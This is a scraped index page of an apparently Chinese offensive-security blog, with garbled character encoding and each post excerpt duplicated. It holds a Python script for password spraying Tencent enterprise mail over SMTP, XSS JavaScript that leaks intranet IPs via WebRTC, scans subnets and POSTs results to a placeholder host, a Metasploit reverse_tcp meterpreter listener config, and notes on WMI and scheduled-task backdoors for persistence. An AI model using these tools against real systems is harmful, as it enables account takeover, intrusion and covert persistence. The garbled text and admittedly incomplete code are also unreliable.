<p><a target="_blank" rel="noopener" href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p>
<p>å¯ä»¥è°ƒç”¨wmiçš„æ–¹å¼æˆ–è€…è¯­è¨€:</p>
<pre class="line-numbers language-none"><code class="language-none">* wmic.exe
* winrm.exe
* winrs.exe
* powershell
* windows scripting host(WSH)
   * VBScript
   * JScript
* mof
* C&#x2F;C++ via IWbem* COM API
* .NET System.Management classes
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>å•ä¸€ç‚¹ï¼š<br>ä¸€ä¸ªå®šæ—¶åŠŸèƒ½åé—¨çš„wmiï¼Œå…¶ä¸­çš„äº‹ä»¶è¿‡æ»¤æ˜¯ç”¨WQLæŸ¥è¯¢æ¥è§¦å‘ï¼Œwooyunä¸Šé¢æ²¹ä¸‰ç§è§¦å‘æ–¹å¼:</p>
<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3>
	

	</div>
  <a type="button" href="/2017/07/12/wmi.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="windowsä¸‹çš„å®šæ—¶ä»»åŠ¡"><a href="#windowsä¸‹çš„å®šæ—¶ä»»åŠ¡" class="headerlink" title="windowsä¸‹çš„å®šæ—¶ä»»åŠ¡"></a>windowsä¸‹çš„å®šæ—¶ä»»åŠ¡</h3><blockquote>
<p>ç»´æŒæƒé™çš„è¯è¿˜æ˜¯è€ƒè™‘WMIäº‹ä»¶æˆ–è€…åœ¨æœåŠ¡ä¸Šä¸‹æ‰‹.  å¦‚åŠ«æŒç›¸å…³æœåŠ¡æŒ‡å‘çš„ç¨‹åºï¼Œæœªè¢«åŒå¼•å·ä¿æŠ¤çš„è·¯å¾„ç­‰ï¼Œæ·»åŠ è®¡åˆ’ä»»åŠ¡ä¸€æ—¦è¢«æŠ¥è­¦.å°±æ˜¯æ•´ä¸ªå›¢é˜Ÿçš„ç¾éš¾</p>
</blockquote>
<h2 id="WMIåé—¨"><a href="#WMIåé—¨" class="headerlink" title="WMIåé—¨"></a>WMIåé—¨</h2><p>wmiçš„é€»è¾‘ç»“æ„æ˜¯è¿™æ ·çš„ï¼š<br>é¦–å…ˆæ˜¯wmiä½¿ç”¨è€…ï¼Œæ¯”å¦‚è„šæœ¬æˆ–è€…å…¶ä»–ç”¨åˆ°wmiæ¥å£çš„åº”ç”¨ç¨‹åºã€‚ç”±wmiä½¿ç”¨è€…è®¿é—®CIMå¯¹è±¡ç®¡ç†å™¨WinMgmtï¼ˆå³WMIæœåŠ¡ï¼‰ï¼Œåè€…å†è®¿é—®CIMï¼ˆå…¬å…±ä¿¡æ¯æ¨¡å‹Common Information Modelï¼‰å­˜å‚¨åº“ã€‚</p>
<p>é™æ€æˆ–åŠ¨æ€çš„ä¿¡æ¯ï¼ˆå¯¹è±¡çš„å±æ€§ï¼‰å°±ä¿å­˜åœ¨CIMåº“ä¸­ï¼ŒåŒæ—¶ä¿å­˜å¯¹è±¡çš„æ–¹æ³•ã€‚æ¯”å¦‚å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼Œé€šè¿‡æ‰§è¡Œå¯¹è±¡çš„æ–¹æ³•å®ç°ï¼Œå®é™…ä¸Šæ˜¯é€šè¿‡COMæŠ€æœ¯è°ƒç”¨å„ç§dllï¼Œæœ€åç”±dllä¸­å°è£…çš„APIå®Œæˆè¯·æ±‚ã€‚WMIæ˜¯äº‹ä»¶é©±åŠ¨çš„ï¼Œæ“ä½œç³»ç»Ÿã€æœåŠ¡ã€åº”ç”¨ç¨‹åºã€è®¾å¤‡é©±åŠ¨ç¨‹åºç­‰éƒ½å¯ä»¥ä½œä¸ºäº‹ä»¶æºï¼Œé€šè¿‡COMæ¥å£ç”Ÿæˆäº‹ä»¶é€šçŸ¥ï¼ŒWinMgmtæ•æ‰åˆ°äº‹ä»¶ï¼Œç„¶ååˆ·æ–°CIMåº“ä¸­çš„åŠ¨æ€ä¿¡æ¯ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆWMIæœåŠ¡ä¾èµ–äºEventLogçš„åŸå› ã€‚å°±åƒæ³¨å†Œè¡¨æœ‰æ ¹é”®ä¸€æ ·ï¼ŒCIMåº“ä¹Ÿæœ‰åˆ†ç±»ï¼Œç”¨é¢å‘å¯¹è±¡çš„æœ¯è¯­æè¿°æ¥æ¥è¯´ï¼Œå«åšå‘½åç©ºé—´(Name Spaceï¼‰</p>
<p><a target="_blank" rel="noopener" href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p>
<p>å¯ä»¥è°ƒç”¨wmiçš„æ–¹å¼æˆ–è€…è¯­è¨€:</p>
<pre class="line-numbers language-none"><code class="language-none">* wmic.exe
* winrm.exe
* winrs.exe
* powershell
* windows scripting host(WSH)
   * VBScript
   * JScript
* mof
* C&#x2F;C++ via IWbem* COM API
* .NET System.Management classes
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>å•ä¸€ç‚¹ï¼š<br>ä¸€ä¸ªå®šæ—¶åŠŸèƒ½åé—¨çš„wmiï¼Œå…¶ä¸­çš„äº‹ä»¶è¿‡æ»¤æ˜¯ç”¨WQLæŸ¥è¯¢æ¥è§¦å‘ï¼Œwooyunä¸Šé¢æ²¹ä¸‰ç§è§¦å‘æ–¹å¼:</p>
<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3>
	
	</div>
  <a type="button" href="/2017/07/12/wmi.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/05/24/schtaskså®šæ—¶åé—¨.html" >powershellå®šæ—¶ä»»åŠ¡åé—¨</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-05-24  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>windowsä¸‹æŸ¥è¯¢å®šæ—¶ä»»åŠ¡ï¼Œä¼šå‡ºç°æ— æ³•åŠ è½½åˆ—èµ„æºçš„æƒ…å†µï¼š</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmdæ‰§è¡Œä¹‹åï¼Œåˆ‡æ¢åˆ°è‹±æ–‡çš„cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;åˆ—å‡ºæ‰€æœ‰task
schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;åˆ—å‡ºæ‰€æœ‰xmlæ–‡ä»¶æ ¼å¼çš„å®šæ—¶ä»»åŠ¡
schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;åˆ—å‡ºæŸä¸ªä»»åŠ¡çš„è¯¦ç»†ä¿¡æ¯ï¼ˆTN: TaskName)
schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;åˆ é™¤æŸä¸ªå®šæ—¶ä»»åŠ¡ï¼Œè¿™ä¸ªåå­—å¯ä»¥å†queryçš„æ—¶å€™æ‰¾åˆ°, &#x2F;f å¼ºåˆ¶åˆ é™¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<p>ä¸€ç§æ˜¯å®šæ—¶ä»»åŠ¡ï¼Œä½†æ˜¯æ‰§è¡Œpowershellçš„æ—¶å€™ä¼šå¼¹çª—<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>è®¾ç½®userid   <userid>NT AUTHORITY\SYSTEM</userid> å³å¯</p>
<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>msfæ¥æ”¶å¤šä¸ªshellå¯ä»¥å¦‚ä¸‹è¿™æ ·åšï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 192.168.1.117
set LPORT 31337
set ExitOnSession false
exploit -j -z

æˆ–è€…ä¸Šé¢çš„ä¿å­˜ä¸ºlistener.rcï¼Œç„¶åmsfconsoleå¯åŠ¨
msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>XMLæ–‡ä»¶å¦‚ä¸‹:</p>
	

	</div>
  <a type="button" href="/2017/05/24/schtaskså®šæ—¶åé—¨.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>windowsä¸‹æŸ¥è¯¢å®šæ—¶ä»»åŠ¡ï¼Œä¼šå‡ºç°æ— æ³•åŠ è½½åˆ—èµ„æºçš„æƒ…å†µï¼š</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmdæ‰§è¡Œä¹‹åï¼Œåˆ‡æ¢åˆ°è‹±æ–‡çš„cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;åˆ—å‡ºæ‰€æœ‰task
schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;åˆ—å‡ºæ‰€æœ‰xmlæ–‡ä»¶æ ¼å¼çš„å®šæ—¶ä»»åŠ¡
schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;åˆ—å‡ºæŸä¸ªä»»åŠ¡çš„è¯¦ç»†ä¿¡æ¯ï¼ˆTN: TaskName)
schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;åˆ é™¤æŸä¸ªå®šæ—¶ä»»åŠ¡ï¼Œè¿™ä¸ªåå­—å¯ä»¥å†queryçš„æ—¶å€™æ‰¾åˆ°, &#x2F;f å¼ºåˆ¶åˆ é™¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<p>ä¸€ç§æ˜¯å®šæ—¶ä»»åŠ¡ï¼Œä½†æ˜¯æ‰§è¡Œpowershellçš„æ—¶å€™ä¼šå¼¹çª—<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>è®¾ç½®userid   <userid>NT AUTHORITY\SYSTEM</userid> å³å¯</p>
<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>msfæ¥æ”¶å¤šä¸ªshellå¯ä»¥å¦‚ä¸‹è¿™æ ·åšï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 192.168.1.117
set LPORT 31337
set ExitOnSession false
exploit -j -z

æˆ–è€…ä¸Šé¢çš„ä¿å­˜ä¸ºlistener.rcï¼Œç„¶åmsfconsoleå¯åŠ¨
msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>XMLæ–‡ä»¶å¦‚ä¸‹:</p>
	
	</div>
  <a type="button" href="/2017/05/24/schtaskså®šæ—¶åé—¨.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/05/23/xss-get-ip.html" >XSSè·å–å†…ç½‘åœ°å€</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-05-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
<p>ä»£ç æœªæµ‹è¯•</p>
<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
if (RTCPeerConnection) (function()&#123;
	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
	if (window.mozRTCPeerConnection)&#123;
		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
	&#125;;
	rtc.onicecandidate &#x3D; function(evt)&#123;
		if (evt.candidate) grepSDP(evt.candidate.candidate);
	&#125;;
	rtc.createOffer(function(offerDesc)&#123;
		grepSDP(offerDesc.sdp);
		rtc.setLocalDescription(offerDesc);
	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
	var addrs &#x3D; Object.create(null);
	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
	function updateDisplay(newAddr)&#123;
		if(newAddr in addrs) return;
		else addrs[newAddr] &#x3D; true;
		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
		sendip(address);
	&#125;
	function grepSDP(sdp)&#123;
		var hosts &#x3D; [];
		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
				var parts &#x3D; line.split(&#39; &#39;),
				addr &#x3D; parts[4],
				type &#x3D; parts[7];
				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
				var parts &#x3D; line.split(&#39; &#39;),
				addr &#x3D; parts[2];
				updateDisplay(addr);
			&#125;
		&#125;);
	&#125;
&#125;)();
function sendip(ipaddress)&#123;
	var url &#x3D; &quot;xxxxx&quot;;
&#125;

ï¼ï¼ï¼ï¼ä»£ç è²Œä¼¼ä¸å…¨ï¼ï¼ï¼ï¼

function ipsend(ip, netport)&#123;
	var ipdata &#x3D; ip+&quot;:&quot;+netport;
	var url &#x3D; &quot;x.x.x.x&quot;;
	var xmlhttp1 &#x3D; new XMLHttpRequest();
	xmlhttp1.open(&quot;POST&quot;,url,true);
	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);

function ipCreate(ip)&#123;
	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
		ElementCreate(ips+i,&quot;80&quot;,i);
		ElementCreate(ips+i,&quot;8087&quot;,i);
		ElementCreate(ips+i,&quot;8080&quot;,i);
	&#125;
&#125;
function ElementCreate(ip,xport,i)&#123;
	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
	scriptElement.src &#x3D; url;
	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
	document.body.appendChild(scriptElement);
&#125;
ipcreate(&quot;10.10.125.195&quot;);
&#125;

&#x3D;ï¼ï¼ï¼ï¼ä»£ç è²Œä¼¼ä¸å…¨ï¼ï¼ï¼ï¼







<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
<p>ä»£ç æœªæµ‹è¯•</p>
<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
if (RTCPeerConnection) (function()&#123;
	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
	if (window.mozRTCPeerConnection)&#123;
		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
	&#125;;
	rtc.onicecandidate &#x3D; function(evt)&#123;
		if (evt.candidate) grepSDP(evt.candidate.candidate);
	&#125;;
	rtc.createOffer(function(offerDesc)&#123;
		grepSDP(offerDesc.sdp);
		rtc.setLocalDescription(offerDesc);
	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
	var addrs &#x3D; Object.create(null);
	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
	function updateDisplay(newAddr)&#123;
		if(newAddr in addrs) return;
		else addrs[newAddr] &#x3D; true;
		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
		sendip(address);
	&#125;
	function grepSDP(sdp)&#123;
		var hosts &#x3D; [];
		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
				var parts &#x3D; line.split(&#39; &#39;),
				addr &#x3D; parts[4],
				type &#x3D; parts[7];
				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
				var parts &#x3D; line.split(&#39; &#39;),
				addr &#x3D; parts[2];
				updateDisplay(addr);
			&#125;
		&#125;);
	&#125;
&#125;)();
function sendip(ipaddress)&#123;
	var url &#x3D; &quot;xxxxx&quot;;
&#125;

ï¼ï¼ï¼ï¼ä»£ç è²Œä¼¼ä¸å…¨ï¼ï¼ï¼ï¼

function ipsend(ip, netport)&#123;
	var ipdata &#x3D; ip+&quot;:&quot;+netport;
	var url &#x3D; &quot;x.x.x.x&quot;;
	var xmlhttp1 &#x3D; new XMLHttpRequest();
	xmlhttp1.open(&quot;POST&quot;,url,true);
	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);

function ipCreate(ip)&#123;
	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
		ElementCreate(ips+i,&quot;80&quot;,i);
		ElementCreate(ips+i,&quot;8087&quot;,i);
		ElementCreate(ips+i,&quot;8080&quot;,i);
	&#125;
&#125;
function ElementCreate(ip,xport,i)&#123;
	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
	scriptElement.src &#x3D; url;
	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
	document.body.appendChild(scriptElement);
&#125;
ipcreate(&quot;10.10.125.195&quot;);
&#125;

&#x3D;ï¼ï¼ï¼ï¼ä»£ç è²Œä¼¼ä¸å…¨ï¼ï¼ï¼ï¼







<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/05/19/baopo-Q.html" >æŸä¼ä¸šé‚®ç®±çˆ†ç ´</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-05-19  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
# coding: utf-8

import smtplib
import random
import time
import sys


def tencent(user, password):
	time.sleep(random.uniform(2, 6))
	smtp_server &#x3D; &quot;smtp.exmail.qq.com&quot;
	smtp_port &#x3D; 587
	server &#x3D; smtplib.SMTP(smtp_server, smtp_port)
	server.starttls()
	try:
		server.login(user, password)
		print &#39;[+]----------auth success------%s&#39; % password
	except smtplib.SMTPAuthenticationError as e:
		print &#39;[+] Auth Fail %s: %s&#39; % (user, password)


def genpasswd(user, suffix):
	domain &#x3D; suffix.split(&#39;.&#39;)[0]
	password &#x3D; []
	password.append(domain + &#39;@123&#39;)
	password.append(domain + &#39;@1234&#39;)
	name &#x3D; user.split(&#39;@&#39;)[0]
	wake_value&#x3D;[&#39;!@#$%^1qazxsw2 &#39;, &#39;admin!@#&#39;, &#39;Abc123&#39;, &#39;123456aa~&#39;, &#39;qazwsx123&#39;, &#39;1qaz2wsx&#39;, &#39;asd123456&#39;, &#39;123456a~&#39;, &#39;Asdf1234&#39;, &#39;Qwer1234&#39;, &#39;Abcd1234&#39;, &#39;a123456&#39;, &#39;123456a&#39;, name[0].upper()+name[1:]+&#39;123&#39;, name+&#39;123&#39;, name+&#39;1234&#39;,name+&#39;@2016&#39;, name+&#39;@2017&#39;]
	password.extend(wake_value)
	return password


def genusers(userfiles, suffix):
	users &#x3D; []
	with open(userfiles, &#39;rb&#39;) as f:
		while 1:
			user &#x3D; f.readline().strip()
			if user &#x3D;&#x3D; &#39;&#39;:
				break
			users.append(user + &#39;@&#39; + suffix)
		return users

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
	if len(sys.argv) !&#x3D; 3:
		print &#39;Usage: %s userfile domain&#39; % sys.argv[0]
		print &#39;%s users.txt baidu.com&#39; % sys.argv[0]
		exit(0)
	userfile &#x3D; sys.argv[1]
	suffix &#x3D; sys.argv[2]
	for user in genusers(userfile, suffix):
		for password in genpasswd(user, suffix):
			tencent(user, password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/05/19/baopo-Q.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
# coding: utf-8

import smtplib
import random
import time
import sys


def tencent(user, password):
	time.sleep(random.uniform(2, 6))
	smtp_server &#x3D; &quot;smtp.exmail.qq.com&quot;
	smtp_port &#x3D; 587
	server &#x3D; smtplib.SMTP(smtp_server, smtp_port)
	server.starttls()
	try:
		server.login(user, password)
		print &#39;[+]----------auth success------%s&#39; % password
	except smtplib.SMTPAuthenticationError as e:
		print &#39;[+] Auth Fail %s: %s&#39; % (user, password)


def genpasswd(user, suffix):
	domain &#x3D; suffix.split(&#39;.&#39;)[0]
	password &#x3D; []
	password.append(domain + &#39;@123&#39;)
	password.append(domain + &#39;@1234&#39;)
	name &#x3D; user.split(&#39;@&#39;)[0]
	wake_value&#x3D;[&#39;!@#$%^1qazxsw2 &#39;, &#39;admin!@#&#39;, &#39;Abc123&#39;, &#39;123456aa~&#39;, &#39;qazwsx123&#39;, &#39;1qaz2wsx&#39;, &#39;asd123456&#39;, &#39;123456a~&#39;, &#39;Asdf1234&#39;, &#39;Qwer1234&#39;, &#39;Abcd1234&#39;, &#39;a123456&#39;, &#39;123456a&#39;, name[0].upper()+name[1:]+&#39;123&#39;, name+&#39;123&#39;, name+&#39;1234&#39;,name+&#39;@2016&#39;, name+&#39;@2017&#39;]
	password.extend(wake_value)
	return password


def genusers(userfiles, suffix):
	users &#x3D; []
	with open(userfiles, &#39;rb&#39;) as f:
		while 1:
			user &#x3D; f.readline().strip()
			if user &#x3D;&#x3D; &#39;&#39;:
				break
			users.append(user + &#39;@&#39; + suffix)
		return users

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
	if len(sys.argv) !&#x3D; 3:
		print &#39;Usage: %s userfile domain&#39; % sys.argv[0]
		print &#39;%s users.txt baidu.com&#39; % sys.argv[0]
		exit(0)
	userfile &#x3D; sys.argv[1]
	suffix &#x3D; sys.argv[2]
	for user in genusers(userfile, suffix):
		for password in genpasswd(user, suffix):
			tencent(user, password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/05/19/baopo-Q.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/04/12/xss-encode2.html" >XSSç¼–ç </a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-04-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a href="http://jkme.github.io/xss-encode-decode.html">http://jkme.github.io/xss-encode-decode.html</a></li>
<li><a target="_blank" rel="noopener" href="http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html">http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html</a></li>
</ul>
<p>åœ¨å‰é¢æ–‡ç« é‡Œé¢xssçš„ç¼–ç æåˆ°è¿‡è¿™ä¸ªä¸œè¥¿: </p>
<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<strong>HTMLæ ‡ç­¾é‡Œé¢</strong>ï¼Œjsä¹‹è¡Œä¹‹å‰ï¼Œhtmlå½¢å¼çš„ç¼–ç ä¼šè‡ªåŠ¨decodeã€‚</p>
<p>è§£é‡Šï¼š</p>
